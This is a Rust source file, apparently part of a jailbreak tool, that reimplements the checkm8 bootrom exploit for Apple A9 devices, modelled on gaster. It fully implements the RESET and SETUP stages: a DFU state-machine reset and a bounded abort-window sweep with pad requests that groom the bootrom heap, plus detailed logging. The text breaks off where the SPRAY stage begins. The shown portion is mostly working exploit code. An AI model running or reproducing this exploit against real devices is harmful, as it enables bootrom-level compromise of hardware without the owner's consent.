//! The four checkm8 stages and the round loop. FROZEN SURFACE — `INTERFACE.md` §4.
//!
//! The algorithm is gaster's, not ours. What this file adds is a **bounded,
//! instrumented** SETUP sweep and an honest transport contract:
//!
//! * The reference's SETUP loop is `for(;;)` with no output (gaster.c:852-858).
//!   That unbounded silence is what cost this project a session: a 35 KB log of
//!   one identical pad-request line, with nothing recording which abort window
//!   was tried or what the pad request actually returned. Here every attempt
//!   logs the abort window in ms, the measured abort duration in µs, the bytes
//!   the aborted transfer delivered, the pad length requested and the pad
//!   request's observed outcome — and the whole sweep is capped by
//!   [`SetupBudget`].
//! * The pass condition is a **STALL on the pad request** (gaster.c:853), not
//!   `OK` and not a timeout. A timeout means the device is NAKing, which is the
//!   signature of the failure we are chasing, so timeouts are counted and named
//!   rather than folded into "did not pass".
//! * The bus reset after **every** stage attempt (gaster.c:1268) is not an
//!   optimisation target. It cleans the DFU state, and after PATCH it is what
//!   fires the overwritten `dfu_handle_bus_reset` callback. It is verified, not
//!   trusted: gaster discards `libusb_reset_device`'s result, and on Windows
//!   that call returns success even when it only cycled pipes
//!   (`windows_winusb.c:3419`), so `run` consults the reset report and refuses.
//!
//! Stage order, fixed (gaster.c:1231-1276):
//! `RESET → SETUP → SPRAY → PATCH → bus reset → re-open → check PWND`, and a
//! failed stage sends the machine back to RESET.

use std::thread::sleep;
use std::time::{Duration, Instant};

use crate::config::{all_configs, config_for_identity, PayloadKind, SocConfig};
use crate::payload::{self, BuiltPayload, OVERWRITE_STRUCT_SIZE};
use crate::trace::{kind, Tracer};
use crate::types::{DriverClass, ResetCapability, RunOutcome, Stage, XferResult, XferStatus};
use crate::usb::{CtrlReq, Transport};
use crate::{
    DFU_CLRSTATUS, DFU_DNLOAD, DFU_FILE_SUFFIX_LEN, DFU_GETSTATUS, DFU_MAX_TRANSFER_SZ,
    DFU_STATE_MANIFEST, DFU_STATE_MANIFEST_SYNC, DFU_STATE_MANIFEST_WAIT_RESET, DFU_STATUS_OK,
    EP0_MAX_PACKET_SZ,
};

// ---------------------------------------------------------------------------
// The unresolved parameter
// ---------------------------------------------------------------------------

/// gaster's `USB_MAX_STRING_DESCRIPTOR_IDX` (gaster.c:52), used as `wIndex` on
/// every leak request (gaster.c:866, 875, 886).
pub const LEAK_WINDEX_GASTER: u16 = 0x0A;

/// The alternative `wIndex`, kept as a parameter because this is the one
/// parameter of the algorithm we have not resolved against real hardware.
///
/// **Not the same value `a9ctl` used.** `a9ctl/src/checkm8.rs:108` sets
/// `LEAK_WINDEX_IPWNDFU = 0x40A` and comments that 0x40A is "ipwndfu's value";
/// the frozen contract for this crate says `0x00`, which is what ipwndfu's
/// `USBRequestLeak` passes as `wIndex` in the A9-adjacent paths and what the
/// A9 bootrom's DFU stack is expected to want. We did not re-derive either from
/// a vendored ipwndfu, so neither is claimed as measured: both are exposed so a
/// single A/B run decides it. `a9pwn run --leak-windex-ipwndfu` selects this one.
pub const LEAK_WINDEX_IPWNDFU: u16 = 0x00;

/// Bound on the SPRAY loop, which in the reference is also `for(;;)`
/// (gaster.c:902). Deliberately *not* a module constant: the reference's loop is
/// unbounded and is bounded here only by the run-level budget
/// (`RunOptions::setup_budget`, the only bounded-spin budget the frozen option
/// set carries), with every iteration logged.

/// gaster's own default, and the value every run of the previous session used.
const DEFAULT_USB_TIMEOUT_MS: u32 = 5;

// ---------------------------------------------------------------------------
// Stage results
// ---------------------------------------------------------------------------

/// A stage failure, with a stable machine-greppable code and the last transfer
/// that was in flight. `code` is what a reader greps for; `detail` is what a
/// human reads; `last` is the evidence.
///
/// Codes emitted by this module:
///
/// | code | meaning |
/// |---|---|
/// | `RESET_SUFFIX_NOT_ACCEPTED` | the 16-byte DNLOAD of RESET did not return OK/16 |
/// | `RESET_STATE_FAILED` | the DFU state machine did not reach MANIFEST_WAIT_RESET |
/// | `RESET_FLUSH_NOT_ACCEPTED` | the trailing 0x40-byte DNLOAD of RESET failed |
/// | `SETUP_BUDGET_EXHAUSTED` | the sweep hit `SetupBudget` without a pad STALL |
/// | `SETUP_PAD_LENGTH_INVALID` | `overwrite_pad - transferred` does not fit a u16 |
/// | `SPRAY_UNSUPPORTED_CHIP` | SPRAY's A9 branch was asked for a non-A9 die |
/// | `SPRAY_UNSUPPORTED_LARGE_LEAK` | `large_leak != 0`: a heap layout we do not drive |
/// | `SPRAY_BUDGET_EXHAUSTED` | the stall/leak/no-leak loop never converged |
/// | `PATCH_OVERWRITE_NOT_STALLED` | the 48-byte callback overflow did not STALL |
/// | `PATCH_OVERWRITE_SIZE_INVALID` | the built overflow buffer is not one `dfu_callback_t` |
/// | `PATCH_UPLOAD_SHORT` | a payload chunk did not return OK with every byte sent |
/// | `TRANSPORT_DEVICE_LOST` | the device disappeared mid-stage |
/// All three fields are deliberate: `code` is what a reader greps for, `detail`
/// is what a human reads, `last` is the evidence. (`XferResult` is only
/// `Debug + Clone` in §1, so neither this type nor `StageResult` can derive
/// `PartialEq`; compare with `is_pass` / `fail_code` instead.)
#[derive(Debug, Clone)]
pub struct StageFail {
    pub code: &'static str,
    pub detail: String,
    pub last: Option<XferResult>,
}

#[derive(Debug, Clone)]
pub enum StageResult {
    Pass,
    Fail(StageFail),
}

impl StageResult {
    pub fn is_pass(&self) -> bool {
        matches!(self, StageResult::Pass)
    }

    pub fn fail_code(&self) -> Option<&'static str> {
        match self {
            StageResult::Pass => None,
            StageResult::Fail(f) => Some(f.code),
        }
    }
}

fn fail(code: &'static str, detail: impl Into<String>, last: Option<XferResult>) -> StageResult {
    StageResult::Fail(StageFail {
        code,
        detail: detail.into(),
        last,
    })
}

// ---------------------------------------------------------------------------
// Options
// ---------------------------------------------------------------------------

/// Caps on the SETUP sweep. Both are honoured; whichever trips first wins.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SetupBudget {
    pub max_attempts: u64,
    pub max_millis: u64,
}

impl Default for SetupBudget {
    fn default() -> Self {
        SetupBudget {
            max_attempts: 20_000,
            max_millis: 600_000,
        }
    }
}

#[derive(Debug, Clone)]
pub struct RunOptions {
    pub max_rounds: u32,
    /// gaster's `usb_timeout` (gaster.c:1631-1633 default 5).
    pub usb_timeout_ms: u32,
    /// gaster's `usb_abort_timeout_min` (gaster.c:1635-1637 default 0).
    pub abort_timeout_min_ms: u32,
    pub leak_windex: u16,
    pub dry_run: bool,
    pub verbose: bool,
    pub trace_path: Option<std::path::PathBuf>,
    pub allow_winusb: bool,
    pub stage_filter: Option<Stage>,
    pub setup_budget: SetupBudget,
    pub stop_after_setup_stall: bool,
    pub settle_ms: u32,
}

impl Default for RunOptions {
    fn default() -> Self {
        RunOptions {
            max_rounds: 64,
            usb_timeout_ms: DEFAULT_USB_TIMEOUT_MS,
            abort_timeout_min_ms: 0,
            leak_windex: LEAK_WINDEX_GASTER,
            dry_run: false,
            verbose: false,
            trace_path: None,
            allow_winusb: false,
            stage_filter: None,
            setup_budget: SetupBudget::default(),
            stop_after_setup_stall: false,
            settle_ms: 0,
        }
    }
}

impl RunOptions {
    fn timeout_ms(&self) -> u32 {
        self.usb_timeout_ms.max(1)
    }
}

pub struct StageIo<'a> {
    pub usb: &'a mut Transport,
    pub trace: &'a mut Tracer,
    pub cfg: &'a SocConfig,
    pub opts: &'a RunOptions,
}

// ---------------------------------------------------------------------------
// The abort sweep, as pure functions
// ---------------------------------------------------------------------------
//
// Extracted from the loop so the sweep can be pinned by tests without a device.
// This is the part `a9ctl` got wrong: its pump interval was 5 ms and its cancel
// deadline was only evaluated after each pump slice, so windows 0,1,2,3,4 all
// cancelled at >= 5 ms. Six labels, one experiment. Here the window *is* the
// deadline handed to the transport (`XferResult::abort_after_ms`), and every
// attempt logs the measured duration so a reader can see the windows differ.

/// gaster.c:849 — the sweep starts at `usb_timeout - 1`, **not** at 0 and not at
/// `abort_min`: gaster computes the first window before it ever consults
/// `usb_abort_timeout_min`, so an `abort_min` equal to `usb_timeout` still sees
/// one attempt at `usb_timeout - 1` before the cycle pins. Reproduced exactly,
/// because that first window is a real experiment.
pub fn initial_abort_window(usb_timeout_ms: u32, _abort_min_ms: u32) -> u32 {
    usb_timeout_ms.max(1) - 1
}

/// Number of distinct windows in the cycle: `usb_timeout - abort_min + 1`
/// (gaster.c:857). Saturating, so a nonsense option pair cannot divide by zero.
pub fn window_span(usb_timeout_ms: u32, abort_min_ms: u32) -> u32 {
    let t = usb_timeout_ms.max(1);
    let m = abort_min_ms.min(t);
    t - m + 1
}

/// gaster.c:857 — `(t + 1) % (usb_timeout - abort_min + 1) + abort_min`.
pub fn advance_abort_window(window: u32, usb_timeout_ms: u32, abort_min_ms: u32) -> u32 {
    let t = usb_timeout_ms.max(1);
    let m = abort_min_ms.min(t);
    let span = window_span(t, m);
    let w = window.clamp(m, m + span - 1);
    (w + 1) % span + m
}

/// The first `n` windows of a sweep, starting where gaster starts.
pub fn sweep_windows(usb_timeout_ms: u32, abort_min_ms: u32, n: usize) -> Vec<u32> {
    let mut w = initial_abort_window(usb_timeout_ms, abort_min_ms);
    let mut out = Vec::with_capacity(n);
    for _ in 0..n {
        out.push(w);
        w = advance_abort_window(w, usb_timeout_ms, abort_min_ms);
    }
    out
}

/// gaster's `send_usb_control_request_async_no_data` returns `completed != 0`
/// (gaster.c:243-283): the async transfer was **reaped**, whatever its terminal
/// status. gaster's callback sets `completed = 1` for every terminal libusb
/// status (gaster.c:220-223), so the reference's predicate at gaster.c:853 —
/// `send_async(...) && tr.sz < config_overwrite_pad` — evaluates `sz` and issues
/// the pad request **even after `LIBUSB_TRANSFER_ERROR`**.
///
/// That is deliberate in the reference and is reproduced here: the pad request is
/// about the heap state the aborted transfer left behind, and a URB that moved
/// bytes and *then* errored has still left that state. Windows can plausibly reap
/// a mid-data-stage babble as `TRANSFER_ERROR`, which is exactly the case where
/// declaring the attempt "not completed" would skip the pad and silently diverge
/// from gaster.
///
/// Only a device that is gone is not a measurement: `NoDevice` means there is
/// nothing left to pad, and the transport refuses further transfers on that
/// handle anyway. Every pad request logs the preceding abort's terminal status,
/// its transferred count and its `libusb_rc`, so if padding after an error turns
/// out to be the wrong call the trace shows it rather than hiding it.
pub fn abort_completed(r: &XferResult) -> bool {
    !matches!(r.status, XferStatus::NoDevice)
}

/// Did the transport refuse this transfer instead of running it?
///
/// The transport's refused/poisoned shape (`usb::Transport::refused`): status
/// `Error`, zero measured micros, and — the distinguishing field — no abort
/// window at all, because the transfer was never submitted. A genuinely reaped
/// `Error` always carries `abort_after_ms = Some(t)` from `control_async_abort`.
/// Used only to stop a dead handle from being swept 20 000 times.
pub fn abort_was_refused(r: &XferResult) -> bool {
    r.status == XferStatus::Error && r.abort_after_ms.is_none() && r.micros == 0
}

/// The pad request length, or `None` when gaster would not send one.
///
/// gaster.c:853: the pad is sent when the aborted transfer delivered *fewer*
/// than `config_overwrite_pad` bytes. A `0` from the host satisfies that (as it
/// does in the reference) — but `0` is read as "the host reported nothing",
/// never as "the device consumed zero bytes", which is why it is counted
/// separately in the sweep log.
pub fn pad_request_len(overwrite_pad: u32, transferred: usize) -> Option<u32> {
    if transferred as u64 >= overwrite_pad as u64 {
        return None;
    }
    Some(overwrite_pad - transferred as u32)
}

// ---------------------------------------------------------------------------
// Low-level request helpers, named after gaster's
// ---------------------------------------------------------------------------

/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480): a zeroed
/// buffer of `len` bytes, or a true zero-length transfer when `len == 0`.
fn req_no_data(io: &mut StageIo, bm: u8, b: u8, value: u16, index: u16, len: u16) -> XferResult {
    let timeout = io.opts.timeout_ms();
    if len == 0 {
        io.usb.control_no_data(
            CtrlReq {
                bm,
                b,
                value,
                index,
                length: 0,
            },
            timeout,
        )
    } else {
        let buf = vec![0u8; len as usize];
        io.usb.control_out(
            CtrlReq {
                bm,
                b,
                value,
                index,
                length: len,
            },
            &buf,
            timeout,
        )
    }
}

/// A real data-bearing control transfer, `gaster`'s `send_usb_control_request`
/// with a payload (gaster.c:226-240).
fn req_out(io: &mut StageIo, r: CtrlReq, data: &[u8]) -> XferResult {
    let timeout = io.opts.timeout_ms();
    io.usb.control_out(r, data, timeout)
}

/// gaster's `send_usb_control_request_async_no_data` (gaster.c:482-495): the
/// transfer is submitted and aborted after `cancel_after_ms`, and the byte count
/// that actually crossed is what the caller decides on.
fn req_async(
    io: &mut StageIo,
    bm: u8,
    b: u8,
    value: u16,
    index: u16,
    len: u16,
    cancel_after_ms: u32,
) -> XferResult {
    let mut buf = vec![0u8; len as usize];
    io.usb.control_async_abort(
        CtrlReq {
            bm,
            b,
            value,
            index,
            length: len,
        },
        &mut buf,
        cancel_after_ms,
    )
}

/// gaster's `dfu_check_status` (gaster.c:819-827). The 6-byte reply is
/// `status, poll_timeout[3], state, str_idx`, so the state is byte 4.
///
/// `stage` is threaded in rather than hardcoded: the same poll is used by RESET's
/// `dfu_set_state_wait_reset` and by PATCH's trailing MANIFEST walk
/// (gaster.c:1220-1222), and logging a PATCH poll under RESET would make the
/// JSONL answer "which stage failed" wrongly — the exact class of lie this tool
/// exists to eliminate.
fn dfu_check_status(
    io: &mut StageIo,
    stage: Stage,
    status: u8,
    state: u8,
    label: &'static str,
) -> (bool, XferResult) {
    let mut buf = [0u8; 6];
    let timeout = io.opts.timeout_ms();
    let r = io.usb.control(
        CtrlReq {
            bm: 0xA1,
            b: DFU_GETSTATUS,
            value: 0,
            index: 0,
            length: 6,
        },
        &mut buf,
        timeout,
    );
    let ok = r.status == XferStatus::Ok
        && r.transferred == 6
        && buf[0] == status
        && buf[4] == state;
    io.trace.xfer(stage, label, &r);
    (ok, r)
}

/// gaster's `dfu_set_state_wait_reset` (gaster.c:829-834), short-circuiting in
/// the same order: a zero-length DNLOAD, then MANIFEST_SYNC, MANIFEST,
/// MANIFEST_WAIT_RESET.
fn dfu_set_state_wait_reset(io: &mut StageIo) -> (bool, Option<XferResult>) {
    let a = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, 0);
    io.trace.xfer(Stage::Reset, "reset_set_wait_reset_dnload_0", &a);
    if !(a.status == XferStatus::Ok && a.transferred == 0) {
        return (false, Some(a));
    }

    let mut last = a;
    for (state, label) in [
        (DFU_STATE_MANIFEST_SYNC, "reset_status_manifest_sync"),
        (DFU_STATE_MANIFEST, "reset_status_manifest"),
        (DFU_STATE_MANIFEST_WAIT_RESET, "reset_status_manifest_wait_reset"),
    ] {
        let (ok, r) = dfu_check_status(io, Stage::Reset, DFU_STATUS_OK, state, label);
        last = r;
        if !ok {
            io.trace.predicate(
                Stage::Reset,
                "dfu_set_state_wait_reset",
                false,
                &format!("state {state} was not reached; last reply {}", last.one_line()),
            );
            return (false, Some(last.clone()));
        }
    }
    io.trace.predicate(
        Stage::Reset,
        "dfu_set_state_wait_reset",
        true,
        "MANIFEST_SYNC -> MANIFEST -> MANIFEST_WAIT_RESET (gaster.c:829-834)",
    );
    (true, Some(last))
}

// ---------------------------------------------------------------------------
// RESET
// ---------------------------------------------------------------------------

/// gaster's `checkm8_stage_reset` (gaster.c:836-845): push the DFU state machine
/// into MANIFEST_WAIT_RESET so the next bus reset is the one that matters.
pub fn stage_reset(io: &mut StageIo) -> StageResult {
    io.trace
        .event("reset_begin", Some(Stage::Reset), "DFU state machine -> MANIFEST_WAIT_RESET");

    let suffix = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
    io.trace.xfer(Stage::Reset, "reset_dnload_suffix", &suffix);
    if !(suffix.status == XferStatus::Ok && suffix.transferred == DFU_FILE_SUFFIX_LEN as usize) {
        return reset_recovery(
            io,
            "RESET_SUFFIX_NOT_ACCEPTED",
            format!(
                "the {DFU_FILE_SUFFIX_LEN}-byte DNLOAD returned {} with {} bytes (gaster.c:840)",
                suffix.status, suffix.transferred
            ),
            suffix,
        );
    }

    let (ok, last) = dfu_set_state_wait_reset(io);
    if !ok {
        return reset_recovery(
            io,
            "RESET_STATE_FAILED",
            format!(
                "the device did not reach MANIFEST_WAIT_RESET. Last status reply: {}",
                last.as_ref().map(|r| r.one_line()).unwrap_or_default()
            ),
            last.unwrap_or(suffix),
        );
    }

    let flush = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
    io.trace.xfer(Stage::Reset, "reset_dnload_flush", &flush);
    if !(flush.status == XferStatus::Ok && flush.transferred == EP0_MAX_PACKET_SZ as usize) {
        return reset_recovery(
            io,
            "RESET_FLUSH_NOT_ACCEPTED",
            format!(
                "the trailing {EP0_MAX_PACKET_SZ:#X}-byte DNLOAD returned {} with {} bytes \
                 (gaster.c:840)",
                flush.status, flush.transferred
            ),
            flush,
        );
    }

    StageResult::Pass
}

/// gaster.c:843 — clear the DFU status so the driver's next attempt starts from
/// a clean state machine rather than inheriting this failure.
fn reset_recovery(
    io: &mut StageIo,
    code: &'static str,
    detail: String,
    last: XferResult,
) -> StageResult {
    let clr = req_no_data(io, 0x21, DFU_CLRSTATUS, 0, 0, 0);
    io.trace.xfer(Stage::Reset, "reset_clr_status_recovery", &clr);
    fail(code, detail, Some(last))
}

// ---------------------------------------------------------------------------
// SETUP
// ---------------------------------------------------------------------------

/// The whole point of this rewrite: a SETUP sweep that says what it tried.
///
/// Target transfer sizes and the pass condition are gaster's, unchanged
/// (gaster.c:848-860):
///
/// 1. submit an async `DFU_DNLOAD` of `DFU_MAX_TRANSFER_SZ` (0x800) aborted after
///    the current window;
/// 2. if it delivered fewer than `overwrite_pad` bytes, send a **pad request** of
///    `overwrite_pad - transferred` bytes as a `bm=0, b=0` control OUT, and
///    **STALL is the pass condition**;
/// 3. otherwise (or if the pad did not STALL) send a `DFU_DNLOAD` of
///    `EP0_MAX_PACKET_SZ` and advance the window.
pub fn stage_setup(io: &mut StageIo) -> StageResult {
    let usb_timeout = io.opts.timeout_ms();
    let abort_min = io.opts.abort_timeout_min_ms.min(usb_timeout);
    let span = window_span(usb_timeout, abort_min);
    let pad_target = io.cfg.overwrite_pad;
    let mut window = initial_abort_window(usb_timeout, abort_min);

    let mut stats = SetupStats::new(pad_target, usb_timeout, abort_min);
    let started = Instant::now();

    io.trace.event(
        "setup_begin",
        Some(Stage::Setup),
        &format!(
            "overwrite_pad=0x{pad_target:X} usb_timeout={usb_timeout}ms abort_min={abort_min}ms \
             first_window={window}ms span={span} budget_attempts={} budget_ms={} \
             (gaster.c:849 starts at usb_timeout-1)",
            io.opts.setup_budget.max_attempts, io.opts.setup_budget.max_millis
        ),
    );

    loop {
        stats.attempts += 1;
        let elapsed_ms = started.elapsed().as_millis() as u64;
        if stats.attempts > io.opts.setup_budget.max_attempts
            || (io.opts.setup_budget.max_millis > 0 && elapsed_ms >= io.opts.setup_budget.max_millis)
        {
            let detail = format!(
                "SETUP exhausts its budget without a pad STALL after {} attempts / {} ms \
                 (budget {} attempts / {} ms). {}",
                stats.attempts - 1,
                elapsed_ms,
                io.opts.setup_budget.max_attempts,
                io.opts.setup_budget.max_millis,
                stats.summary()
            );
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            println!("  SETUP: {}", one_line(&summary));
            io.trace.predicate(
                Stage::Setup,
                "setup_pad_stall",
                false,
                &format!("budget exhausted without a pad STALL: {}", one_line(&summary)),
            );
            return fail(
                "SETUP_BUDGET_EXHAUSTED",
                detail,
                stats.last_pad.clone().or_else(|| stats.last_abort.clone()),
            );
        }

        stats.note_window(window);

        // 1. the aborted transfer.
        let abort = req_async(
            io,
            0x21,
            DFU_DNLOAD,
            0,
            0,
            DFU_MAX_TRANSFER_SZ,
            window,
        );
        io.trace.xfer(Stage::Setup, "setup_abort_dnload", &abort);

        // A transport that is refusing transfers (device gone, handle poisoned)
        // never reaped anything: the sweep cannot converge and would just burn
        // its whole budget on 0-us errors. Report it as the transport failure it
        // is; the run loop's reset + re-open then decides whether to continue.
        if abort_was_refused(&abort) {
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            return fail(
                "TRANSPORT_DEVICE_LOST",
                format!(
                    "the transport refused the aborted DNLOAD on attempt {} without submitting it \
                     (status Error, 0 us, no abort window): the device handle is gone. {}",
                    stats.attempts, summary
                ),
                Some(abort),
            );
        }

        // 2. the pad request, exactly when gaster sends one.
        let mut pad_len: Option<u32> = None;
        let mut pad: Option<XferResult> = None;
        let completed = abort_completed(&abort);
        if completed {
            if let Some(len) = pad_request_len(pad_target, abort.transferred) {
                if len > u16::MAX as u32 {
                    return fail(
                        "SETUP_PAD_LENGTH_INVALID",
                        format!(
                            "pad request length {len} exceeds the u16 wLength of a control \
                             transfer (overwrite_pad 0x{pad_target:X}, aborted transfer \
                             delivered {})",
                            abort.transferred
                        ),
                        Some(abort),
                    );
                }
                pad_len = Some(len);
                // gaster.c:853 — bm=0, b=0, wValue=0, wIndex=0: a request the
                // bootrom's DFU stack has no handler for, which is *why* a STALL
                // here is the success signal.
                let p = req_no_data(io, 0, 0, 0, 0, len as u16);
                io.trace.xfer(Stage::Setup, "setup_pad_request", &p);
                stats.record_pad(&p);
                pad = Some(p);
            }
        }

        let line = stats.attempt_line(&abort, window, pad_len, pad.as_ref());
        io.trace.event("setup_attempt", Some(Stage::Setup), &line);
        if should_print_attempt(io.opts, stats.attempts) {
            println!("  SETUP: {line}");
        }

        // A sweep that cannot vary, or that is not varying, is one experiment
        // wearing N labels — the defect that made the previous tool's log
        // misleading. Say it once, loudly, then keep working.
        if let Some(msg) = stats.frozen_sweep_notice() {
            io.trace
                .event("setup_degenerate_sweep", Some(Stage::Setup), &msg);
            io.trace
                .predicate(Stage::Setup, "abort_window_can_vary", false, &msg);
            println!("  SETUP: WARNING - {msg}");
        }

        if let Some(p) = &pad {
            if p.status == XferStatus::Stall {
                stats.pad_stalls += 1;
                let summary = stats.summary();
                io.trace.event("setup_summary", Some(Stage::Setup), &summary);
                io.trace.event(
                    "setup_stall",
                    Some(Stage::Setup),
                    &format!(
                        "pad request of {pad_len:?} bytes STALLed after {} attempts — the pass \
                         condition (gaster.c:853)",
                        stats.attempts
                    ),
                );
                println!("  SETUP: PASSED - pad STALL after {} attempts. {}", stats.attempts, one_line(&summary));
                io.trace.predicate(
                    Stage::Setup,
                    "setup_pad_stall",
                    true,
                    &format!(
                        "pad request of {pad_len:?} bytes STALLed on attempt {} (gaster.c:853)",
                        stats.attempts
                    ),
                );
                return StageResult::Pass;
            }
        }

        // 3. gaster.c:856-857 — the drain DNLOAD, then advance the window.
        let drain = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
        io.trace.xfer(Stage::Setup, "setup_drain_dnload", &drain);
        if drain.status == XferStatus::NoDevice {
            let summary = stats.summary();
            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
            return fail(
                "TRANSPORT_DEVICE_LOST",
                format!("the device disappeared during the SETUP sweep. {}", stats.summary()),
                Some(drain),
            );
        }
        window = advance_abort_window(window, usb_timeout, abort_min);
    }
}

/// Print every attempt when `--verbose`, otherwise the head of the sweep and
/// then a sparse tail. The reference prints nothing here at all, and 35 KB of
/// one repeated line is what that cost us; 20 000 lines of progress is the same
/// mistake with the sign flipped. Nothing is hidden: every attempt is written to
/// the trace file regardless, and the sweep summary is always printed.
const SETUP_STDOUT_HEAD: u64 = 20;
const SETUP_STDOUT_EVERY: u64 = 100;

fn should_print_attempt(opts: &RunOptions, attempt: u64) -> bool {
    opts.verbose || attempt <= SETUP_STDOUT_HEAD || attempt % SETUP_STDOUT_EVERY == 0
}

#[derive(Debug, Clone)]
struct SetupStats {
    attempts: u64,
    pad_target: u32,
    usb_timeout: u32,
    abort_min: u32,
    windows: Vec<u32>,
    pad_sent: u64,
    pad_stalls: u64,
    pad_ok: u64,
    pad_timeouts: u64,
    pad_other: u64,
    short_aborts: u64,
    /// Host reported 0 bytes for the aborted transfer. Logged explicitly because
    /// a 0 here is "we learned nothing", not "the device took nothing".
    zero_aborts: u64,
    incomplete_aborts: u64,
    last_abort: Option<XferResult>,
    last_pad: Option<XferResult>,
    last_micros: u64,
    /// Graph-theoretic facts about whether this sweep can vary at all.
    span: u32,
    degenerate: bool,
    frozen_reported: bool,
}

impl SetupStats {
    fn new(pad_target: u32, usb_timeout: u32, abort_min: u32) -> SetupStats {
        let span = window_span(usb_timeout, abort_min);
        SetupStats {
            attempts: 0,
            pad_target,
            usb_timeout,
            abort_min,
            windows: Vec::new(),
            pad_sent: 0,
            pad_stalls: 0,
            pad_ok: 0,
            pad_timeouts: 0,
            pad_other: 0,
            short_aborts: 0,
            zero_aborts: 0,
            incomplete_aborts: 0,
            last_abort: None,
            last_pad: None,
            last_micros: 0,
            span,
            // abort_min == usb_timeout makes gaster.c:857's modulus 1: the window
            // is pinned and the "sweep" is one experiment with N labels. gaster
            // only rejects abort_min *strictly greater* than usb_timeout
            // (gaster.c:1635-1638), so it has the same trap.
            degenerate: span == 1,
            frozen_reported: false,
        }
    }

    /// `Some(message)` exactly once when the sweep cannot vary (span == 1) or is
    /// observed not to vary over more attempts than the cycle has windows.
    fn frozen_sweep_notice(&mut self) -> Option<String> {
        if self.frozen_reported {
            return None;
        }
        let structural = self.degenerate;
        let observed = self.attempts > self.span as u64 + 1 && self.windows.len() == 1;
        if !(structural || observed) {
            return None;
        }
        self.frozen_reported = true;
        Some(format!(
            "the abort window is NOT sweeping: {} attempt(s), {} distinct window(s) [{}]. \
             usb_timeout={}ms abort_min={}ms gives gaster.c:857's cycle a span of {}{}, so the \
             window cannot vary and the sweep is one experiment wearing N labels — the defect \
             that made the previous tool's log misleading. Lower --abort-min-ms or raise \
             --usb-timeout-ms (gaster only rejects abort_min > usb_timeout, gaster.c:1635-1638, \
             so it inherits this too).",
            self.attempts,
            self.windows.len(),
            self.windows
                .iter()
                .map(|w| format!("{w}ms"))
                .collect::<Vec<_>>()
                .join(","),
            self.usb_timeout,
            self.abort_min,
            self.span,
            if structural {
                " (abort_min == usb_timeout)"
            } else {
                ""
            },
        ))
    }

    fn note_window(&mut self, w: u32) {
        if !self.windows.contains(&w) {
            self.windows.push(w);
        }
    }

    fn record_pad(&mut self, p: &XferResult) {
        self.pad_sent += 1;
        match p.status {
            XferStatus::Stall => self.pad_stalls += 1,
            XferStatus::Ok => self.pad_ok += 1,
            XferStatus::Timeout => self.pad_timeouts += 1,
            _ => self.pad_other += 1,
        }
        self.last_pad = Some(p.clone());
    }

    fn attempt_line(
        &mut self,
        abort: &XferResult,
        window: u32,
        pad_len: Option<u32>,
        pad: Option<&XferResult>,
    ) -> String {
        self.last_abort = Some(abort.clone());
        self.last_micros = abort.micros;
        if abort.transferred == 0 {
            self.zero_aborts += 1;
        }
        if pad_request_len(self.pad_target, abort.transferred).is_some() {
            self.short_aborts += 1;
        }
        if !abort_completed(abort) {
            self.incomplete_aborts += 1;
        }

        let delivered = if abort.transferred == 0 {
            "0 (host reported nothing)".to_string()
        } else {
            abort.transferred.to_string()
        };
        let pad_part = match (pad_len, pad) {
            (Some(len), Some(p)) => format!(
                "pad_req={len} after_abort_status={} after_abort_xfer={}/{} \
                 after_abort_rc={} pad_status={} pad_xfer={}/{} pad_micros={}",
                abort.status,
                abort.transferred,
                abort.requested,
                abort.libusb_rc,
                p.status,
                p.transferred,
                p.requested,
                p.micros
            ),
            (Some(len), None) => format!(
                "pad_req={len} after_abort_status={} after_abort_rc={} pad_status=NOT_SENT",
                abort.status, abort.libusb_rc
            ),
            _ => format!(
                "pad_req=none (delivered >= overwrite_pad 0x{:X}) after_abort_status={} \
                 after_abort_rc={}",
                self.pad_target, abort.status, abort.libusb_rc
            ),
        };
        // A non-zero window that returns immediately did not wait, whatever the
        // transport called it. Flagged inline rather than left for the reader to
        // notice from the micros column.
        let short_return = if window >= 1 && abort.micros < 100 {
            format!(
                " returned_in_{}us_which_is_far_short_of_the_{}ms_window",
                abort.micros, window
            )
        } else {
            String::new()
        };
        let sweep = if self.degenerate {
            "sweep=DEGENERATE(span=1)"
        } else {
            "sweep=ok"
        };
        format!(
            "attempt={} abort_window_ms={} {sweep} abort_status={} abort_xfer={}/{} \
             abort_micros={} note=\"{}{}\" {}",
            self.attempts,
            window,
            abort.status,
            delivered,
            abort.requested,
            abort.micros,
            abort_note(abort),
            short_return,
            pad_part
        )
    }

    fn summary(&self) -> String {
        let windows = self
            .windows
            .iter()
            .map(|w| format!("{w}ms"))
            .collect::<Vec<_>>()
            .join(",");
        format!(
            "attempts={} distinct_abort_windows={} [{}] span={}{} pad_sent={} pad_stall={} \
             pad_ok={} pad_timeout={} pad_other={} short_aborts={} zero_aborts={} \
             incomplete_aborts={} last_window_micros={} (usb_timeout={}ms abort_min={}ms \
             overwrite_pad=0x{:X})",
            self.attempts,
            self.windows.len(),
            windows,
            self.span,
            if self.degenerate {
                " DEGENERATE(span=1, window cannot vary)"
            } else {
                ""
            },
            self.pad_sent,
            self.pad_stalls,
            self.pad_ok,
            self.pad_timeouts,
            self.pad_other,
            self.short_aborts,
            self.zero_aborts,
            self.incomplete_aborts,
            self.last_micros,
            self.usb_timeout,
            self.abort_min,
            self.pad_target,
        )
    }
}

fn abort_note(r: &XferResult) -> &'static str {
    match r.status {
        XferStatus::Cancelled => "cancelled at the requested window",
        XferStatus::Timeout => "libusb timeout at usb_timeout; device was NAKing",
        XferStatus::Stall => "device STALLed the aborted transfer",
        XferStatus::Ok => "transfer completed inside the window",
        XferStatus::NoDevice => "device gone",
        XferStatus::Error => "host-side error; transfer was never reaped",
    }
}

fn one_line(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

// ---------------------------------------------------------------------------
// SPRAY
// ---------------------------------------------------------------------------

/// gaster's `checkm8_usb_request_stall` (gaster.c:889-894): `bm=2, b=3,
